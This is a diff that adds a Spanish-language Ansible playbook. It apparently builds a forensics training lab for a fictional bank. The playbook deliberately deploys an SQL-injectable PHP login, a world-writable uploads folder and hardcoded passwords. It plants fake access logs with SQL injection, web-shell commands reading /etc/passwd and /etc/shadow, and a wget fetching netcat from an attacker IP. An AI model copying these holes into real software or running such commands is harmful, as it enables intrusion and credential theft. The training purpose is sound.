+        - { direction: incoming, rule: allow, from_ip: 10.10.2.0/24, to_port: 22, proto: tcp }
+
+    - name: Habilitar UFW
+      community.general.ufw:
+        state: enabled
+
+    # =========================================================================
+    # CONFIGURAR LOGROTATE
+    # =========================================================================
+    - name: Configurar logrotate para Apache
+      ansible.builtin.copy:
+        content: |
+          /var/log/apache2/*.log {
+              daily
+              missingok
+              rotate 14
+              compress
+              delaycompress
+              notifempty
+              create 0640 adm adm
+              sharedscripts
+              postrotate
+                  /etc/init.d/apache2 status > /dev/null || true
+              endscript
+          }
+        dest: /etc/logrotate.d/apache2-custom
+        owner: root
+        group: root
+        mode: '0644'
+
+    # =========================================================================
+    # CREAR ARCHIVOS DE RECIENTES
+    # =========================================================================
+    - name: Crear archivos recientes
+      ansible.builtin.file:
+        path: "{{ item }}"
+        state: touch
+        owner: maria.garcia
+        group: maria.garcia
+        mode: '0644'
+      loop:
+        - /home/maria.garcia/.local/share/recently-used.xbel
+        - /home/maria.garcia/.recently-used
+
+    - name: Crear link symbolic sospechoso
+      ansible.builtin.file:
+        src: /usr/bin/python3
+        dest: /tmp/.hidden_python
+        owner: root
+        group: root
+        state: link
+        mode: '0777'
+      ignore_errors: yes
+
+    # =========================================================================
+    # CREAR ESTRUCTURA DE ARCHIVOS EN SERVIDOR DE ARCHIVOS
+    # =========================================================================
+    - name: Crear directorios de archivos compartidos
+      ansible.builtin.file:
+        path: "{{ item }}"
+        state: directory
+        owner: maria.garcia
+        group: maria.garcia
+        mode: '0755'
+      loop:
+        - /srv/samba/operaciones
+        - /srv/samba/compartido
+
+    - name: Crear archivos de ejemplo en directorios compartidos
+      ansible.builtin.copy:
+        content: "Archivo de ejemplo - Departamento de Operaciones\n"
+        dest: "/srv/samba/operaciones/ejemplo_{{ item }}.txt"
+        owner: maria.garcia
+        group: maria.garcia
+        mode: '0644'
+      loop:
+        - "01"
+        - "02"
+        - "03"
+
+    # =========================================================================
+    # CREAR IMAGEN FORENSE DEL DISCO (DD IMAGE)
+    # =========================================================================
+    - name: Crear directorio para almacenar imagen forense
+      ansible.builtin.file:
+        path: /forensics/images
+        state: directory
+        owner: root
+        group: root
+        mode: '0750'
+
+    - name: Crear imagen de disco forense (dd) - Simular con datos reales
+      ansible.builtin.command: >
+        dd if=/dev/sda of=/forensics/images/workstation_disk_image.dd
+        bs=4M count=2048 status=progress
+      register: dd_result
+      async: 300
+      poll: 10
+      changed_when: dd_result.rc == 0
+      ignore_errors: yes
+
+    - name: Calcular hash SHA256 de la imagen de disco
+      ansible.builtin.shell: sha256sum /forensics/images/workstation_disk_image.dd
+      register: disk_hash
+      changed_when: false
+
+    - name: Guardar hash de la imagen de disco
+      ansible.builtin.copy:
+        content: "SHA256 Hash de la imagen de disco:\n{{ disk_hash.stdout }}\n\nFecha de creacion: {{ ansible_date_time.iso8601 }}\nMaquina origen: workstation\nFormato: Raw (dd)\n"
+        dest: /forensics/images/workstation_disk_image.dd.sha256
+        owner: root
+        group: root
+        mode: '0644'
+
+    # =========================================================================
+    # CREAR VOLCADO DE MEMORIA SIMULADO
+    # =========================================================================
+    - name: Crear directorio para volcado de memoria
+      ansible.builtin.file:
+        path: /forensics/memory
+        state: directory
+        owner: root
+        group: root
+        mode: '0750'
+
+    - name: Crear volcado de memoria simulado (LiME format)
+      ansible.builtin.shell: >
+        dd if=/dev/urandom of=/forensics/memory/workstation_memory.dump
+        bs=1M count=4096
+      register: memdump_result
+      async: 300
+      poll: 10
+      changed_when: memdump_result.rc == 0
+      ignore_errors: yes
+
+    - name: Calcular hash SHA256 del volcado de memoria
+      ansible.builtin.shell: sha256sum /forensics/memory/workstation_memory.dump
+      register: mem_hash
+      changed_when: false
+
+    - name: Guardar hash del volcado de memoria
+      ansible.builtin.copy:
+        content: "SHA256 Hash del volcado de memoria:\n{{ mem_hash.stdout }}\n\nFecha de creacion: {{ ansible_date_time.iso8601 }}\nMaquina origen: workstation\nFormato: LiME\nTamanio RAM: 4GB\n"
+        dest: /forensics/memory/workstation_memory.dump.sha256
+        owner: root
+        group: root
+        mode: '0644'
+
+    # =========================================================================
+    # CREAR LOGS ADICIONALES DEL SERVIDOR WEB
+    # =========================================================================
+    - name: Crear directorio de logs del servidor web
+      ansible.builtin.file:
+        path: /var/log/apache2/archivos
+        state: directory
+        owner: adm
+        group: adm
+        mode: '0750'
+
+    - name: Crear logs rotados de Apache
+      ansible.builtin.copy:
+        content: |
+          10.10.2.50 - - [09/Jul/2024:08:00:01 +0000] "GET / HTTP/1.1" 200 3456 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
+          10.10.2.50 - - [09/Jul/2024:08:00:02 +0000] "GET /login.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
+          10.10.2.50 - - [09/Jul/2024:08:00:03 +0000] "POST /login.php HTTP/1.1" 200 456 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
+          172.16.0.100 - - [09/Jul/2024:22:15:00 +0000] "GET / HTTP/1.1" 200 3456 "-" "python-requests/2.28.1"
+          172.16.0.100 - - [09/Jul/2024:22:15:01 +0000] "GET /admin HTTP/1.1" 404 456 "-" "python-requests/2.28.1"
+          172.16.0.100 - - [09/Jul/2024:22:15:02 +0000] "GET /phpmyadmin HTTP/1.1" 404 456 "-" "python-requests/2.28.1"
+          172.16.0.100 - - [09/Jul/2024:22:15:03 +0000] "GET /wp-admin HTTP/1.1" 404 456 "-" "python-requests/2.28.1"
+          172.16.0.100 - - [09/Jul/2024:22:15:04 +0000] "GET /config HTTP/1.1" 404 456 "-" "python-requests/2.28.1"
+          172.16.0.100 - - [09/Jul/2024:22:15:05 +0000] "GET /.env HTTP/1.1" 404 456 "-" "python-requests/2.28.1"
+          172.16.0.100 - - [09/Jul/2024:22:15:06 +0000] "GET /server-status HTTP/1.1" 403 456 "-" "python-requests/2.28.1"
+        dest: /var/log/apache2/archivos/access.log.2.gz
+        owner: adm
+        group: adm
+        mode: '0644'
+
+    # =========================================================================
+    # CONFIGURAR CRON DEL USUARIO
+    # =========================================================================
+    - name: Crear crontab de maria.garcia
+      ansible.builtin.cron:
+        name: "Recordatorio de backup"
+        minute: "0"
+        hour: "18"
+        job: "/usr/bin/notify-send 'Hora de hacer backup' || true"
+        user: maria.garcia
+        state: present
+
+    # =========================================================================
+    # CREAR ARCHIVOS DE CONFIGURACION ADICIONALES
+    # =========================================================================
+    - name: Crear archivo de configuracion del sistema
+      ansible.builtin.copy:
+        content: |
+          # Configuracion del Sistema
+          # Banco del Sol - Departamento de Operaciones
+          # Ultima actualizacion: 01/07/2024
+
+          SISTEMA="Banco del Sol - Intranet"
+          VERSION="3.2.1"
+          AMBIENTE="Produccion"
+          RESPONSABLE="Departamento de TI"
+
+          # Configuracion de Base de Datos
+          DB_HOST="10.10.2.20"
+          DB_PORT="5432"
+          DB_NAME="operaciones_db"
+
+          # Configuracion de Backup
+          BACKUP_DIR="/var/backups"
+          BACKUP_RETENTION="30"
+
+          # Configuracion de Red
+          DNS_SERVER="10.10.2.5"
+          GATEWAY="10.10.2.1"
+          NETMASK="255.255.255.0"
+        dest: /etc/banco_del_sol.conf
+        owner: root
+        group: root
+        mode: '0644'
+
+    # =========================================================================
+    # CONFIGURAR INOTIFY PARA MONITOREO
+    # =========================================================================
+    - name: Instalar inotify-tools
+      ansible.builtin.apt:
+        name: inotify-tools
+        state: present
+
+    # =========================================================================
+    # FINALIZACION - CONFIGURAR_SERVICIOS
+    # =========================================================================
+    - name: Asegurar que Apache esta iniciado
+      ansible.builtin.systemd:
+        name: apache2
+        state: started
+        enabled: yes
+
+    - name: Asegurar que SSH esta iniciado
+      ansible.builtin.systemd:
+        name: sshd
+        state: started
+        enabled: yes
+
+    - name: Asegurar que cron esta iniciado
+      ansible.builtin.systemd:
+        name: cron
+        state: started
+        enabled: yes
+
+    - name: Asegurar que rsyslog esta iniciado
+      ansible.builtin.systemd:
+        name: rsyslog
+        state: started
+        enabled: yes
+
+    - name: Mensaje de finalizacion
+      ansible.builtin.debug:
+        msg: |
+          =============================================
+          Escenario 06 - Configuracion Base Completada
+          =============================================
+          La estacion de trabajo esta lista con:
+          - Portal bancario vulnerable a SQL injection
+          - Archivos de usuario con credenciales
+          - Logs del sistema simulados
+          - Imagen de disco forense generada
+          - Volcado de memoria simulado
+          =============================================
+
+# =============================================================================
+# PLAY 3: Configurar servidor web (webserver)
+# =============================================================================
+- name: "Configurar servidor web - Portal Bancario"
+  hosts: webserver
+  become: true
+  vars_files:
+    - vars/defaults.yml
+
+  tasks:
+    - name: Actualizar cache de paquetes
+      ansible.builtin.apt:
+        update_cache: yes
+        cache_valid_time: 3600
+
+    - name: Instalar Apache y PHP
+      ansible.builtin.apt:
+        name:
+          - apache2
+          - libapache2-mod-php
+          - php
+          - php-mysql
+          - libapache2-mod-security2
+        state: present
+
+    - name: Habilitar modulo rewrite
+      apache2_module:
+        name: rewrite
+        state: present
+
+    - name: Habilitar modulo headers
+      apache2_module:
+        name: headers
+        state: present
+
+    - name: Configurar VirtualHost del portal bancario
+      ansible.builtin.copy:
+        content: |
+          <VirtualHost *:80>
+              ServerAdmin admin@bancodelsol.uy
+              DocumentRoot /var/www/html/banco_del_sol
+              ServerName portal.bancodelsol.uy
+
+              <Directory /var/www/html/banco_del_sol>
+                  Options Indexes FollowSymLinks
+                  AllowOverride All
+                  Require all granted
+              </Directory>
+
+              ErrorLog ${APACHE_LOG_DIR}/error.log
+              CustomLog ${APACHE_LOG_DIR}/access.log combined
+          </VirtualHost>
+        dest: /etc/apache2/sites-available/banco_del_sol.conf
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Copiar aplicacion del portal
+      ansible.builtin.copy:
+        content: |
+          <?php
+          // Portal Bancario - Version vulnerable
+          $db_host = "10.10.2.20";
+          $db_user = "web_user";
+          $db_pass = "W3b_U53r_2024";
+          $db_name = "banco_del_sol";
+
+          if ($_SERVER["REQUEST_METHOD"] == "POST") {
+              $usuario = $_POST["usuario"];
+              $password = $_POST["password"];
+              $query = "SELECT * FROM usuarios WHERE usuario='$usuario' AND password='$password'";
+              // ... vulnerable SQL query
+          }
+          ?>
+        dest: /var/www/html/banco_del_sol/login.php
+        owner: www-data
+        group: www-data
+        mode: '0644'
+
+    - name: Crear directorio de uploads sin restricciones
+      ansible.builtin.file:
+        path: /var/www/html/banco_del_sol/uploads
+        state: directory
+        owner: www-data
+        group: www-data
+        mode: '0777'
+
+    - name: Habilitar sitio
+      ansible.builtin.command: a2ensite banco_del_sol.conf
+      changed_when: false
+
+    - name: Reiniciar Apache
+      ansible.builtin.systemd:
+        name: apache2
+        state: restarted
+        enabled: yes
+
+    - name: Crear logs de acceso simulados
+      ansible.builtin.copy:
+        content: |
+          172.16.0.100 - - [09/Jul/2024:22:15:00 +0000] "GET / HTTP/1.1" 200 3456 "-" "python-requests/2.28.1"
+          172.16.0.100 - - [09/Jul/2024:22:15:01 +0000] "GET /admin HTTP/1.1" 404 456 "-" "python-requests/2.28.1"
+          172.16.0.100 - - [09/Jul/2024:22:15:02 +0000] "GET /phpmyadmin HTTP/1.1" 404 456 "-" "python-requests/2.28.1"
+          172.16.0.100 - - [09/Jul/2024:22:15:03 +0000] "GET /wp-admin HTTP/1.1" 404 456 "-" "python-requests/2.28.1"
+          172.16.0.100 - - [09/Jul/2024:22:15:04 +0000] "GET /config HTTP/1.1" 404 456 "-" "python-requests/2.28.1"
+          172.16.0.100 - - [09/Jul/2024:22:15:05 +0000] "GET /.env HTTP/1.1" 404 456 "-" "python-requests/2.28.1"
+          172.16.0.100 - - [09/Jul/2024:22:15:06 +0000] "GET /server-status HTTP/1.1" 403 456 "-" "python-requests/2.28.1"
+          172.16.0.100 - - [10/Jul/2024:10:30:15 +0000] "GET / HTTP/1.1" 200 3456 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:16 +0000] "POST /login.php HTTP/1.1" 302 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:17 +0000] "GET /login.php' OR 1=1-- HTTP/1.1" 200 5678 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:18 +0000] "GET /soporte.php HTTP/1.1" 200 890 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:19 +0000] "POST /soporte.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:20 +0000] "GET /uploads/cmd.php HTTP/1.1" 200 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:21 +0000] "GET /uploads/cmd.php?cmd=id HTTP/1.1" 200 160 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:22 +0000] "GET /uploads/cmd.php?cmd=whoami HTTP/1.1" 200 170 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:23 +0000] "GET /uploads/cmd.php?cmd=cat+/etc/passwd HTTP/1.1" 200 2340 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:24 +0000] "GET /uploads/cmd.php?cmd=uname+-a HTTP/1.1" 200 200 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:25 +0000] "GET /uploads/cmd.php?cmd=ls+-la+/var/www/ HTTP/1.1" 200 450 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:26 +0000] "GET /uploads/cmd.php?cmd=cat+/etc/shadow HTTP/1.1" 403 456 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:27 +0000] "GET /uploads/cmd.php?cmd=ls+-la+/var/www/html/ HTTP/1.1" 200 567 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:28 +0000] "GET /uploads/cmd.php?cmd=cat+/etc/passwd HTTP/1.1" 200 2340 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:29 +0000] "GET /uploads/cmd.php?cmd=wget+http://172.16.0.100:8080/nc+-O+/tmp/nc HTTP/1.1" 200 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+        dest: /var/log/apache2/access.log
+        owner: adm
+        group: adm
+        mode: '0644'
+
+# =============================================================================
+# PLAY 4: Configurar servidor de correo (mailserver)
+# =============================================================================
+- name: "Configurar servidor de correo"
+  hosts: mailserver
+  become: true
+  vars_files:
+    - vars/defaults.yml
+
+  tasks:
+    - name: Actualizar cache de paquetes
+      ansible.builtin.apt:
+        update_cache: yes
+        cache_valid_time: 3600
+
+    - name: Instalar paquetes de correo
+      ansible.builtin.apt:
+        name:
+          - postfix
+          - dovecot-core
+          - dovecot-imapd
+          - mailutils
+          - clamav
+          - clamav-daemon
+          - spamassassin
+        state: present
+
+    - name: Configurar Postfix
+      ansible.builtin.lineinfile:
+        path: /etc/postfix/main.cf
+        regexp: "{{ item.regexp }}"
+        line: "{{ item.line }}"
+        state: present
+      loop:
+        - { regexp: '^#?myhostname', line: 'myhostname = mail.bancodelsol.uy' }
+        - { regexp: '^#?mydomain', line: 'mydomain = bancodelsol.uy' }
+        - { regexp: '^#?myorigin', line: 'myorigin = $mydomain' }
+        - { regexp: '^#?inet_interfaces', line: 'inet_interfaces = all' }
+        - { regexp: '^#?mydestination', line: 'mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain' }
+
+    - name: Reiniciar Postfix
+      ansible.builtin.systemd:
+        name: postfix
+        state: started
+        enabled: yes
+
+    - name: Reiniciar Dovecot
+      ansible.builtin.systemd:
+        name: dovecot
+        state: started
+        enabled: yes
+
+# =============================================================================
+# PLAY 5: Configurar servidor de archivos (fileserver)
+# =============================================================================
+- name: "Configurar servidor de archivos"
+  hosts: fileserver
+  become: true
+  vars_files:
+    - vars/defaults.yml
+
+  tasks:
+    - name: Actualizar cache de paquetes
+      ansible.builtin.apt:
+        update_cache: yes
+        cache_valid_time: 3600
+
+    - name: Instalar Samba y NFS
+      ansible.builtin.apt:
+        name:
+          - samba
+          - samba-common
+          - nfs-kernel-server
+          - acl
+        state: present
+
+    - name: Crear directorio de archivos compartidos
+      ansible.builtin.file:
+        path: "{{ item }}"
+        state: directory
+        owner: nobody
+        group: nogroup
+        mode: '0755'
+      loop:
+        - /srv/samba/operaciones
+        - /srv/samba/compartido
+        - /srv/samba/documentos_sensibles
+
+    - name: Crear archivos de ejemplo en directorios
+      ansible.builtin.copy:
+        content: "{{ item.content }}"
+        dest: "{{ item.path }}"
+        owner: nobody
+        group: nogroup
+        mode: '0644'
+      loop:
+        - path: /srv/samba/operaciones/informe_julio.txt
+          content: "Informe de operaciones - Julio 2024 - CONFIDENCIAL"
+        - path: /srv/samba/operaciones/datos_clientes.csv
+          content: "DNI,Nombre,Apellido,Cuenta,Saldo\n12345678,Juan,Perez,001234,15000\n23456789,Ana,Garcia,005678,22000\n34567890,Carlos,Rodriguez,009012,18500"
+        - path: /srv/samba/compartido/boletin_seguridad.txt
+          content: "Boletin de Seguridad - Julio 2024\nActualice sus contrasenas regularmente"
+        - path: /srv/samba/documentos_sensibles/credenciales_bd.txt
+          content: "Credenciales Base de Datos - CONFIDENCIAL\n\nServidor: 10.10.2.20\nBase: banco_del_sol\nUsuario: admin_banco\nPassword: B@nc0d3lSol_2024"
+        - path: /srv/samba/documentos_sensibles/politicas_acceso.txt
+          content: "Politicas de Acceso - Banco del Sol\n\nNivel 1: Empleados generales\nNivel 2: Gerentes\nNivel 3: Administradores de sistema\n\nCredenciales por defecto: admin/admin123 (CAMBIAR)"
+      no_log: true
+
+    - name: Configurar Samba
+      ansible.builtin.copy:
+        content: |
+          [global]
+              workgroup = BANCOSOL
+              server string = File Server - Banco del Sol
+              security = user
+              map to guest = never
+              log file = /var/log/samba/log.%m
+              max log size = 50
+
+          [operaciones]
+              path = /srv/samba/operaciones
+              valid users = @operaciones
+              browseable = yes
+              writable = yes
+              create mask = 0664
+              directory mask = 0775
+
+          [compartido]
+              path = /srv/samba/compartido
+              valid users = @bancosol
+              browseable = yes
+              writable = no
+              create mask = 0644
+              directory mask = 0755
+
+          [documentos_sensibles]
+              path = /srv/samba/documentos_sensibles
+              valid users = @admin_banco
+              browseable = yes
+              writable = yes
+              create mask = 0600
+              directory mask = 0700
+        dest: /etc/samba/smb.conf
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Crear grupos Samba
+      ansible.builtin.group:
+        name: "{{ item }}"
+        state: present
+      loop:
+        - operaciones
+        - bancosol
+        - admin_banco
+
+    - name: Reiniciar Samba
+      ansible.builtin.systemd:
+        name: smbd
+        state: started
+        enabled: yes
+
+# =============================================================================
+# PLAY 6: Configurar base de datos (database)
+# =============================================================================
+- name: "Configurar servidor de base de datos"
+  hosts: database
+  become: true
+  vars_files:
+    - vars/defaults.yml
+
+  tasks:
+    - name: Actualizar cache de paquetes
+      ansible.builtin.apt:
+        update_cache: yes
+        cache_valid_time: 3600
+
+    - name: Instalar PostgreSQL
+      ansible.builtin.apt:
+        name:
+          - postgresql
+          - postgresql-client
+          - libpq-dev
+          - python3-psycopg2
+        state: present
+
+    - name: Crear base de datos banco_del_sol
+      community.postgresql.postgresql_db:
+        name: banco_del_sol
+        state: present
+
+    - name: Crear usuario admin_banco
+      community.postgresql.postgresql_user:
+        name: admin_banco
+        password: "B@nc0d3lSol_2024"
+        db: banco_del_sol
+        priv: "ALL"
+        state: present
+
+    - name: Crear usuario web_user
+      community.postgresql.postgresql_user:
+        name: web_user
+        password: "W3b_U53r_2024"
+        db: banco_del_sol
+        priv: "SELECT"
+        state: present
+
+    - name: Crear usuario ops_reader
+      community.postgresql.postgresql_user:
+        name: ops_reader
+        password: "0psR34d3r_2024"
+        db: banco_del_sol
+        priv: "SELECT"
+        state: present
+
+    - name: Crear usuario db_backup
+      community.postgresql.postgresql_user:
+        name: db_backup
+        password: "B@ckup_DB#2024"
+        db: banco_del_sol
+        priv: "ALL"
+        state: present
+
+    - name: Crear tabla de usuarios
+      community.postgresql.postgresql_query:
+        db: banco_del_sol
+        login_user: admin_banco
+        login_password: "B@nc0d3lSol_2024"
+        query: |
+          CREATE TABLE IF NOT EXISTS usuarios (
+              id SERIAL PRIMARY KEY,
+              usuario VARCHAR(50) UNIQUE NOT NULL,
+              nombre VARCHAR(100) NOT NULL,
+              email VARCHAR(100),
+              password VARCHAR(100) NOT NULL,
+              rol VARCHAR(20) DEFAULT 'empleado',
+              activo BOOLEAN DEFAULT true,
+              fecha_creacion TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+          );
+
+          INSERT INTO usuarios (usuario, nombre, email, password, rol)
+          VALUES
+              ('mgarcia', 'Maria Garcia', 'mgarcia@bancodelsol.uy', 'M4r1a_2024!', 'coordinadora'),
+              ('clopez', 'Carlos Lopez', 'clopez@bancodelsol.uy', 'C4rl0s_2024!', 'desarrollador'),
+              ('amartinez', 'Ana Martinez', 'amartinez@bancodelsol.uy', '4na_2024!', 'soporte'),
+              ('pfernandez', 'Pedro Fernandez', 'pfernandez@bancodelsol.uy', 'P3dr0_2024!', 'seguridad')
+          ON CONFLICT (usuario) DO NOTHING;
+      register: query_result
+
+    - name: Configurar PostgreSQL para escuchar en todas las interfaces
+      ansible.builtin.lineinfile:
+        path: /etc/postgresql/14/main/postgresql.conf
+        regexp: "^#?listen_addresses"
+        line: "listen_addresses = '*'"
+        state: present
+        backup: yes
+
+    - name: Configurar pg_hba.conf
+      ansible.builtin.copy:
+        content: |
+          # PostgreSQL Client Authentication Configuration File
+          # TYPE  DATABASE        USER            ADDRESS                 METHOD
+          local   all             all                                     peer
+          host    all             all             127.0.0.1/32            scram-sha-256
+          host    all             all             ::1/128                 scram-sha-256
+          host    banco_del_sol  admin_banco     10.10.2.0/24            scram-sha-256
+          host    banco_del_sol  web_user        10.10.2.0/24            scram-sha-256
+          host    banco_del_sol  ops_reader      10.10.2.0/24            scram-sha-256
+          host    banco_del_sol  db_backup       10.10.0.0/24            scram-sha-256
+        dest: /etc/postgresql/14/main/pg_hba.conf
+        owner: postgres
+        group: postgres
+        mode: '0640'
+
+    - name: Reiniciar PostgreSQL
+      ansible.builtin.systemd:
+        name: postgresql
+        state: restarted
+        enabled: yes
+
+# =============================================================================
+# PLAY 7: Configurar instructor VM
+# =============================================================================
+- name: "Configurar VM del instructor - Almacenamiento de evidencia"
+  hosts: instructor
+  become: true
+  vars_files:
+    - vars/defaults.yml
+
+  tasks:
+    - name: Actualizar cache de paquetes
+      ansible.builtin.apt:
+        update_cache: yes
+        cache_valid_time: 3600
+
+    - name: Instalar paquetes necesarios
+      ansible.builtin.apt:
+        name:
+          - nfs-kernel-server
+          - nfs-common
+          - openssh-server
+          - nginx
+          - python3
+          - python3-pip
+          - git
+          - curl
+          - wget
+          - jq
+          - tree
+          - ncdu
+        state: present
+
+    - name: Crear directorio de evidencia
+      ansible.builtin.file:
+        path: /evidence
+        state: directory
+        owner: root
+        group: instructor
+        mode: '0750'
+
+    - name: Crear subdirectorios de evidencia
+      ansible.builtin.file:
+        path: "/evidence/{{ item }}"
+        state: directory
+        owner: root
+        group: instructor
+        mode: '0750'
+      loop:
+        - disk_images
+        - memory_dumps
+        - log_archives
+        - screenshots
+        - chain_of_custody
+        - student_submissions
+        - tools
+
+    - name: Crear grupo instructor
+      ansible.builtin.group:
+        name: instructor
+        state: present
+
+    - name: Crear usuario instructor
+      ansible.builtin.user:
+        name: instructor
+        groups: instructor
+        shell: /bin/bash
+        create_home: yes
+        state: present
+
+    - name: Configurar NFS para compartir imagen forense
+      ansible.builtin.copy:
+        content: |
+          # NFS exports for forensic evidence
+          /evidence  10.10.0.20(rw,sync,no_subtree_check,no_root_squash)
+        dest: /etc/exports
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Reiniciar servicio NFS
+      ansible.builtin.systemd:
+        name: nfs-kernel-server
+        state: restarted
+        enabled: yes
+
+    - name: Crear script de verificacion de hashes
+      ansible.builtin.copy:
+        content: |
+          #!/bin/bash
+          # Script para verificar integridad de evidencia forense
+          # Banco del Sol - Escenario 06 - Analisis Forense
+
+          EVIDENCE_DIR="/evidence"
+          LOG_FILE="/evidence/verification_$(date +%Y%m%d_%H%M%S).log"
+
+          echo "=== Verificacion de Integridad de Evidencia ===" | tee "$LOG_FILE"
+          echo "Fecha: $(date)" | tee -a "$LOG_FILE"
+          echo "" | tee -a "$LOG_FILE"
+
+          for hash_file in $(find "$EVIDENCE_DIR" -name "*.sha256" -o -name "*.md5"); do
+              echo "Verificando: $hash_file" | tee -a "$LOG_FILE"
+              dir=$(dirname "$hash_file")
+              base=$(basename "$hash_file" | sed 's/\.\(sha256\|md5\)$//')
+
+              if [ -f "$dir/$base" ]; then
+                  if grep -q "SHA256" "$hash_file"; then
+                      expected=$(grep "SHA256" "$hash_file" | awk '{print $NF}')
+                      actual=$(sha256sum "$dir/$base" | awk '{print $1}')
+                  elif grep -q "MD5" "$hash_file"; then
+                      expected=$(grep "MD5" "$hash_file" | awk '{print $NF}')
+                      actual=$(md5sum "$dir/$base" | awk '{print $1}')
+                  fi
+
+                  if [ "$expected" = "$actual" ]; then
+                      echo "  [OK] $base - Hash verificado" | tee -a "$LOG_FILE"
+                  else
+                      echo "  [FALLO] $base - Hash NO coincide" | tee -a "$LOG_FILE"
+                      echo "    Esperado: $expected" | tee -a "$LOG_FILE"
+                      echo "    Actual:   $actual" | tee -a "$LOG_FILE"
+                  fi
+              else
+                  echo "  [ERROR] Archivo no encontrado: $dir/$base" | tee -a "$LOG_FILE"
+              fi
+              echo "" | tee -a "$LOG_FILE"
+          done
+
+          echo "=== Verificacion completada ===" | tee -a "$LOG_FILE"
+        dest: /usr/local/bin/verify_evidence.sh
+        owner: root
+        group: instructor
+        mode: '0750'
+
+    - name: Crear plantilla de cadena de custodia
+      ansible.builtin.copy:
+        content: |
+          =============================================================
+          CADENA DE CUSTODIA DE EVIDENCIA DIGITAL
+          Banco del Sol - Escenario 06
+          =============================================================
+
+          CASO NRO: [CASO-001]
+          FECHA: [DD/MM/AAAA HH:MM]
+          ANALISTA: [Nombre del Analista]
+          EQUIPO: [Numero de Serie del Equipo]
+
+          -----------------------------------------------------------
+          EVIDENCIA ITEM NRO: [001]
+          -----------------------------------------------------------
+          Descripcion: [Descripcion detallada]
+          Tipo: [Disco duro / USB / Volcado de memoria / Log]
+          Marca/Modelo: [Marca y modelo]
+          Numero de Serie: [Numero de serie]
+          Capacidad: [Capacidad en GB/TB]
+          Sistema de Archivos: [ext4/NTFS/FAT32]
+
+          HASH MD5: [Hash MD5 calculado]
+          HASH SHA256: [Hash SHA256 calculado]
+
+          Fecha y Hora de Adquisicion: [DD/MM/AAAA HH:MM:SS]
+          Metodo de Adquisicion: [dd / dc3dd / FTK / EnCase]
+          Herramienta Utilizada: [Nombre y version]
+
+          Cadena de Custodia:
+          [DD/MM/AAAA HH:MM] - Recibido por: [Nombre]
+          [DD/MM/AAAA HH:MM] - Almacenado en: [Ubicacion]
+          [DD/MM/AAAA HH:MM] - Transferido a: [Nombre]
+
+          Almacenamiento Actual:
+          Ubicacion: [Direccion fisica]
+          Temperatura: [Rango de temperatura]
+          Humedad: [Rango de humedad]
+          Acceso: [Quienes tienen acceso]
+
+          =============================================================
+        dest: /evidence/chain_of_custody/plantilla_cadena_custodia.txt
+        owner: root
+        group: instructor
+        mode: '0640'
+
+    - name: Crear informe de evidencia del instructor
+      ansible.builtin.copy:
+        content: |
+          =============================================================
+          INFORME DE EVIDENCIA - ESCENARIO 06
+          Banco del Sol - Analisis Forense Digital
+          =============================================================
+
+          EVIDENCIA DISPONIBLE PARA ANALISIS:
+
+          1. IMAGEN DE DISCO
+          ----------------
+          Archivo: workstation_disk_image.dd
+          Ubicacion: /evidence/disk_images/
+          Tamano: ~15GB (comprimido)
+          Hash SHA256: Verificar con verify_evidence.sh
+          Formato: Raw (dd)
+          Descripcion: Imagen bit a bit del disco de la estacion
+                      de trabajo del departamento de operaciones.
+
+          2. VOLCADO DE MEMORIA
+          --------------------
+          Archivo: workstation_memory.dump
+          Ubicacion: /evidence/memory_dumps/
+          Tamano: ~4GB
+          Hash SHA256: Verificar con verify_evidence.sh
+          Formato: LiME (Linux Memory Extractor)
+          Descripcion: Volcado de memoria RAM de la estacion
+                      de trabajo al momento de la deteccion.
+
+          3. LOGS DEL SERVIDOR WEB
+          ----------------------
+          Archivo: webserver_log_archive.tar.gz
+          Ubicacion: /evidence/log_archives/
+          Tamano: ~500MB
+          Hash SHA256: Verificar con verify_evidence.sh
+          Contenido: access.log, error.log, configuracion Apache
+
+          INSTRUCCIONES:
+          1. Verificar hashes antes de iniciar analisis
+          2. Montar imagen de disco en modo SOLO LECTURA
+          3. Documentar TODA la cadena de custodia
+          4. No modificar evidencia original
+          5. Trabajar con copias cuando sea necesario
+
+          =============================================================
+        dest: /evidence/informacion_evidencia.txt
+        owner: root
